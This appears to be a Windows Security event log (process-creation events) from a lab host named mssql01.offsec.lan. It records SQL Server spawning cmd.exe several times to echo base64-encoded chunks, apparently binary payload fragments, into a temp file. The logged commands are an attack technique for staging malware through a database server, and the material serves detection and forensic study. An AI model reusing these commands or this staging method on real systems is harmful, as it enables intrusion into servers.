<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.664681200Z" />
      <EventRecordID>1331321</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xb54</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo DXzUJz5zB7kBAAAA65kzs4vNFIUFifR0B/fbg9AA99hWagBqClB26KQ2AO5YyIvyisGyCvbqKncEgMMwi8bcH4vZjj502+BFxYtNHG3HXokBi8dfW13DkN+QsiKQjJDXkJCQkNOQVYvsUYtFCFOHiwhR/xWwwRMAi3UMi9j9VQiNRQxSi8tWUEzh/yEAAGoBUYld/Ojh/v//SI1VCFJQxgAKjUUMM8mbis9qAVHohP7//0iNVQhSUMYAhI1FDDPJUIpNimoBUQSa/hH/SExVCFJQxgAujUUMjhgBwesYU+ge/lX/i00Qg8RQtvCJ8F5bi+W8w5CQVYvsg+xWU1aNRfy5i9apUIupCI1N+DPSV2YkUAxRagFS6Br+/4eZ2ItFCIPEFEsUyJD+///GCsOLSLlgRXjolOr//5LAbzmLHhBLK/uLw8ZqP4k6X15bi+Xzw0T+g8nZzv/yrvfRSSvZi8ET+8HpAoalpguLGgyD4QMrw8iki2UQX16JAYvDW3blXcOQkJCQVTrsnps8i4QIi1UMUYsAVk0IUlFqAVDof/3//yLEFD3DkAtqkJCQIJCQkJCQkJCQVYvsgxNcXCwIUwyLdSBXiyP0PGZ1HItNHI1FpFCLRRCNVRhRDk0MUleCUVjAAQAA63aLRRyNNqRSjU0YUItCbI20C1GLTQxSUFEJAfv/OosVl8FVAIvYg1wHPDoBfhUzwGgDFeEAigNQ/xV4wUAAg8QIhRV6FXjBQAAzG4oLiwJmi2BIJQMBAEaFwPKei/uDyf8zwIpVJPKui0Ugi/P40UmL+IkKQYvRwekC56WLyoPhYPOk2j8cX15bwgEAAAAAi+Vdw4pVo4D+LXVskUUYhcDeQYt1IMYGMEaF/35NjAYuK4XAfRf32EzIiUUci7EiMA4wMIv+wekCGLOlyk3JA/OqFEUYi8qKaC8D8QPBQIlFGOs/SEaJRRiKC+dOakOFwH/xSIX/iewYfwSLiySFyXa4xlsuRgsbi3Xjiq+IBkYShf9/v4tFFIWfdATGBi5Gi0WaXQuEyXQLiA6KSwFGQ4TWdfWA+mZ0aNcfRl6JGRh0U425HI1VgVGNTQhSLWoUW+j6+///iwanocQUi02HhdsPlcJGg/nfjYQSK4i4C3U2xgYwRgXmhcl0QYoQiBZGQAx199FFIItN5CtLX4k8+1sW5YvDxgYrRsYGMHTG4jBGi0Ugi00kK/Bfia1IHFvlXcOQkJCQeJCQkJACkJBqkFXG7ItFHItNyZ5VFFqLRZVqAFGLTQxSi1UIUFFS6G75//+D5hxdw7CQ5ZCQXZCo7FWLI1NWV4B9DL4BAAAAIM+LRRpMvMJAwdPmik2TToACWHQFuyERQACLVQiLzkgjyooMGYiyi3DT6oXSdUeLTRSLVRhSbF9eqgr8XUGQkJCQVcPsi00QU+fJRRR1v78AAACLdRi75MJAANPnTzxYdPC70MJAAItVDItFCKvS&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.667162100Z" />
      <EventRecordID>1331322</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xbe4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xb54</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.939748800Z" />
      <EventRecordID>1331323</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x3ec</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo /LSvBYP4/x8bi1UcUovQGFKLVRRSUVDo6Av//4N6FF9eW2Hqi8hOI8+KDBmIDktNEOgdMgAAi8gLynXorEUY/FUcK8ZfqAKLxuVbXa6QoJCQkJBVi4KLTRCLRWWLVQzEyQBSaiJqBFDoFv///4PEFClKkFWL8YPsCFaLdQy3KnUIiXX4iXX86w2LRQiJ3/iNREb/iUX8rVUQjZgUUY0LjVRQaNCGQO3oxJyp/4X2dAZ+TfjGAQCD+P91A/l6/16LRF3Dg8j/w5C3eeiQkJCQkJCQhPuLvYtFCD0gURUAfRWLTRCLVUFR71DohQMA9oPEDF3CDAA9wNSMAH0bUOiRWAAAI00MUIus0lC0SWMApwCXxBBdwqzEPdY5CgCYnItVkotFDGhU+RQAUrroQwAAAIPEDF1hDAA9gD0KAH0Zi00QiwUMaFT5QABRUigjAIUAg8QMXcIMAItNDPOAnwL/FYswEFBR5VkCAACDxAxdwgwAkJBVi+yLRQxXTRBWi3UIUFFWkbsdAADsxl4qw5CQkHmQkFVE7It/GD1xEQEAE4/DAAAAD9G2AJ7aBd5V/wN8+AAP5zcBAAD/JA0EiUAAuIQAQQBdQLhgAEEArZa4QABBGV3puLZuQb9dwyPk/0AAXcNhtP9AAF3DuIj/QAClw7is/0AAXRi4IP9AOF3luPD+fgBddua0/kDLXcO4jP5AAF3DuHz+QGNdw1RYB0AAXSe4LP6HN6jDuBA4QABdw6j0bEAKXc241P1AOF3DuKxeQABdw7hs/UDYXcO4PP1A/l3DuBz9QABdw7gM/UAAXcO4wPxAAF3TBY5O/v+D+BZ35/8qhWyJQAC4cPxAAF3DuEj8l6tdEZwg/NgAXcPM8PtAEV3DuLxCQABd2YeXU9HNXcO4YPu5wF3DuDj7rgBdw7gA+0AAXcO47DxAAF3DLLz6QABmF+SQ+kAAXYu4ZPpAAF3DuDT6QABdw7hB+UAAXcO4tPlAAF3D2Jz5QABdw7iV+VMAXcOQzIdAAPyIQLfTh0AA2mZBAHf3QADoh1tR7w5AAPaeEwD9h8+TBIhA3guIQADliEAAYIhA/SKIFNcniEAALohAAIWIyAAgiEAANYiIANeIQAATiEAASohAAJcLzgBYiEAA/Igap1+IqgOFiEAAjIVAAJOIQACaiED0oYhAj6iIQACviEDx/IhAAJ2IjwDniEAAtohAAL1gQADwiEAAy4j2APyIQAD8iEwA/IhAANKIQADZiGUA4IhAADWIQADuiEDQ9YhTqZCQkJCQkJCQMYtksotdDKzMdQhXi33NaqlTVmgABHYACRsAaAASAAD/FZTA8gCFwHX+QQ2Kw0DRhakMWzk8xRjDQAB0DosmxQ3DQIIshcmL6+tEiwTFHMNAAFNQPHYmGwDai/6DyawzifKu9/BJi8Ewq4VwrDGKXjD/uK/5DXQFgPkedQTGBEgga8B16YvG6F5pXfyLfStX&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:17.941995300Z" />
      <EventRecordID>1331324</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1384</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x3ec</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:18.213725600Z" />
      <EventRecordID>1331325</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xb64</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo aKjBQRxTNujd/P//g84Q98ZfXltdw5CQkJCQkOWQkJBVi+yZRUBQ/xXkwUAAg8QEhbd0E4tNEIsdIFBRUuj0////g8QMXWOLRRAuTQxoVPlArzZR6Mf4//+DxAxdw5BRVYvsg+zOi5smVr51EInr+ItNF2oAiwZgAI1V/IlF9GoAUpHXBC5F9L8BUFKxRfwAAAAA/xWYwUAAHOD/tHdXiz3YwU4A/9dWwIQKiQZfXotXXcL+AP/Xxz4AAPoAXwWA/AoAXovlXcIoAIvk/JUGM8Aii+VdrQwAkJCQkJCLkJBVi+yD7BCLTQxWi9kQagCNVfixAEAvUotV7olF8I1F/IlN9FCLQgSNgfBqAVFQcUX81AAAz8dFJQC+AMYdFZTB8wDQ+JR1LFeLPd/BQL//14XAdQqJBl9ei4cI7QwA/ynHBgAgAABfBdfoCsdei+VdwgwAi0X8iQZe99gb0CVH7v7/BX4RAQCL5V1MWgCQkI9ViyRRiw8IjW4KUMR+ZgSAUQFF/B8AAEb/FbTBQHn0+P91HlaLNdjBQADX1oXAqgVei+Vdw/+889/8CgBeQOVUZzMb0OVdjZCQkJCOTJBVh1WL7FGLTQiN9ppQMH5mBDhRx0X8AQDvAP8VtMEqAIP4/28e54s12MFAAGaRhcB1c16L5V3D/9ZpgPwKAF7QK13DM8CLUCbDkJCQwJAGBZBdVaLsU4tdDFaLdQhXi30Oi8MLx3Upi06Di0YkC8gP3goBRwCLVgRS6NT///+DxASFzA9J9gAAAGLHrF3CDACFPA+MmwAAAH8ItJgPhqwAZgCwRiD+TiQLwXUUuE4EUej9/v//g8QEH8AG1ccAAACLViDO03X18EYkO9APhNqwAACLTRBqAGiLAwAAdVMwsBhPjCgAAItWBIsduMGcQEMEq2gGEIGCLP//0wAb5AsL04tG8WoEV18FEAAAaP//ABZQ/3OLfRCLXQyJlySJXiDFXjPAW13CiaiF/n9STwRu23MqYU4Ex0UI6QBwAFHob5//S4PEBIU9dT18Rh2LPdTBQADu1Qhq9QpoBhAAAGg4fgBDUP/XcFYEI00dagRRPXHK9gBo//9G5FL/14t9EAteIIl+ITMRX15bXcKUJ5CQkJBVi91Ri0UQM8lDwA+VwYlN/ItNDIP5QNVmXTVtAAAPhKgCYfBJg/kPzg4AAwAEcdIZkaKRQQD/JJX41kDWiy2tMgI/TvEP4QKA+XwPM8I7wnQvi04EjYn8apW7am3X//8ALlH/FezBQJCg+NAPikMCrgCLRRCFwCpGOIcODAKJKzgzwF7/5V3CDAAk/YlGM7XAXrHlo8IMW+4hCTPJi1Y4g3IEgPoED80BWK101IsZBDtV/L/ZUmoBaP//AABQ/xW4wUBNg/jCD4ToAZUXi0UQYsCLRjg2DgwEJJA4M8Bei0Jdwgw+JPv0RjgzwF6L5V3CDLSLrwgz0otOOIPhEJ95EA+U&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:18.216064000Z" />
      <EventRecordID>1331326</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xc08</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xb64</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:18.488462400Z" />
      <EventRecordID>1331327</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x3b8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo wjvCD4R1////CU6hgEX8asZQagRo/0EAFVH/ALjBQACD+P/768oBAACLRRAlwItGOCcODBAURt8zwF6L5V02mwAk74lGODPAXovlXcK0AIt1CPLJOkI4TOJ0gPoID1bBzchzhBb/sf+FwHQXiwhBUujS/P//g8QEhcB0G16L5V15DIuLRgRQ6JH8//+DxASFBNiFpQEAAItFEIWqi6quw+eTCIlGODPAXovlXQMM3iVOiUY4M8BeyOVdwgwAi3Vci044g98BFMmwfxvJQTtp0ISp/v//jVWbagRmiXcItkYEUmiAAAAAaP/gAAB+ZsdFCh4A/xW4DkAAg/j3D4SQAAAAi0UQhcCLRjh0DgwYiUY4M55ei+UWXgwAJP6JRjgzwF4l5V3CDACLVUyNTRBqBFGL9gRFARAAAGj//60AUP8VuMFAAIP4/w+CMP6+/+tigfkAQAAAf49qSwAADxjvAAAAgfknSAAAD4SNAADEgfkAAgAABoWxAAAAi46/M9KETjiB4QACAACx+dACAOaXlMI70A+E5f2q/4tOBI1FEGoEUGqFagZR/xW4wUAAg/j/dSGL59jBQAD/1oUadQdeZeVdwhvk/9YFxhgKAF6LB11CmwCLQBCFwBFEOHQPqswCiUY4M8Bei+VdwgwAqeT9iWI4Mwpei+VdwgwAi0UIXlVtapZSi0gEaAIQAEFt//8IwQf/orjBQACD+P8P/V39/7Try4H5AIAAAOAMuBbrAABei+9dwgwAfZxoLSBeiwJdwgwAi/9wj0AA7Y1AAEiOQAACjxgAo479Z96QQAAAAQUCBQUFAwXABQUFBQUEsovs2uwEX9EQi00MVldQjVUiUVLotdn/l4tFPItNCEG+CgCNAIoUhdjEAACNBBTYxEAAiFH/QEGKEIhR/4oXAYtV6IjYQY0ElbTEQADGAUtBABCIEYpQAUFAIRGKQAFBiAGLReSZ9/4dxgEgQQQwdMIwiAGLReBB3Y9Bmff+xgF8QQROjMIwiAGLZ9z5iBEqYcz+CgE6QQQwgMINiAGLRdhBiBFBmfdztQE6QQQwgMKRiAFBiBFBi1Xsv+gDAADGASBBqG9xmwAA/8aZ9//CZAAAxgQwiAG4H4U8UffXwfoFi8JBwegfA9CL9YDCMIgRQZmZ/7hnZuVm7ffqHIkCi+TBpR880IvGgMIwvgoADwCIEUGZ9/5egMIwBsCIEcZBAQCL5V3CDACGlpCQCZCQkFWL7FOLXRBWfIv78XU0M8CLdQjyrvd/gfn4AAAAiU1cjmuKU6SA+jp1oopDAhMvdAQ8XHUaaODsQQBW/3gQwlIAvEUMg8QIg+gEg8bR6zuKAzwvdAQ8XMA0gFYvdAUQ+lx1ioB7Ajp0JIPpAmjMAEEAVoPDAolNEP8VEAJA3FhFDIPECLWECIPGEIlFDI1FDI1NM1BWUVOstBYAAIXAdBs9eIlBAHXDX164FgC5AFtdw4tFEIXA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:18.490688500Z" />
      <EventRecordID>1331328</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xf80</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x3b8</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:18.764140000Z" />
      <EventRecordID>1331329</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x9a0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo dAruXrgmAAAAW13DZov6Z4XAdPdmPS8AdQWZxwZcgWaLeQL+xgJm/cB16TPAX/4hXfCQkJBzkJCQkFWL7FaLVwhXwP9RzAT/EISEAAUAikbChMD7CFbobx/eAIv4i0YYJQDTBAZ0Wj0AAAAGdRdqE/8VCMFA6oPEBGr/efSpFaTAQADrRowAAABedRdqAf8VCMFaAFeMBE3/1fX/FaRjQADrKD0AAHsCdaNqAP8VCMFAAIPEBGr/avb/FaTA+QDrVotGBFD/FXTdQEjBRgT/////i0YMhcB0FYtAEIXAdJ5Q/xV0wEAA80YQAAAAAIvHX15dw5CQMfYTkOug7LhBQAAN6M8kAABTi10QzVcz/8dFUI0AAAD2wwGJffx0B8dF/AAAAIB3wwJ0B4FND6IAAED3FwQAAAh0CcSbUYDMAYlF/FAN3L/9AIO5Hj0Ix0X4BwC/AIvDg+AEdmtww0B0B9EBAAAA6yKKbIDiPfbaG9KD4v6HwgTrD4rTgD4Q9tob0oPiAoPCA4vy9sNAdBKFwHVzX164DQAAAFuL5V3CMwD2xwF0Bb8AkhYE98MAIyAAdFmBzwAAIAD2ygP8gvfDDQAQAA5Pg/kerQaBzwD0AAL3wwAAQAB0ByZN/AAAAgD2VQJ0BoHPCgAAQIP5U3wH9sc+dAmAzyiBzwAAAEiLRUgkjfi///9laAAgAABR6FK9//+DxAzhwA+FkVMAt8hV+FBXVlCLo1M8jXr4Qf//UFH/FbDZQADrG4tV+ItV/ItNDGoAV1ZqAFK4Uf8VrMBAAIDnmsD4/4lFlXUgmDVtwEAA/9aFwA+ErAGzAP/Wb14FgPwKAFtPqPrCtACLVRjOYFLo1LT//4t1CIv4M4qLF7kYqQAA86tVfRiLTRCJFk46i1UMiwZSVyLNBOibwv//i5SJQSCLGYPI/4laGIsO38MIiUEQiUEUixaJQjB0G4sGagJqAGoAx0A0AQAAAOcOi1EdUv8VqMBAAITbeR8gBmgAEAAAV8ZGLAHoXLRo/4sOiUE4TBbHQkAAEACBiwaKSCyEyXUHi3mCCMl0PFeDwFiwAFDosgsAAIXAj0UMdCmLBlDo+v26RoPEBIW4dQ6LDmi1k6gA0FfoTr8UPItFDF/kW2LlXcIUAIM93AhBADLIFov2i0iwhO1RDbITSgAAAIPEk4XAdAuLwItIGIDlBIlICe0WcABXvcJcavpm6Hih///Kx/RvFYs2aCByQABoQIRAAFaLBlDoTmH//zPAX15bLuVdwhQA3pCQVXLsgwZqVot1CI1FyMdF/AAALACLjwRQUf8VvMCMAIXTdA+LRcj2xAJ0BzPAXovlXcOLRgyFwHQRAUAIAAAAAItWi8dCDAA4AAB/RgyLVgRXjU36UFFqGWoAzwBqAGjEAAkAUv8VTsBAAIXAZpVfM8CIi+Vdw4s9mMCujM3Xg8B1Bl/vi4Fdw//XBYD8CgA9ZTsLAA+FsgAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:18.766368500Z" />
      <EventRecordID>1331330</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xa64</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x9a0</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
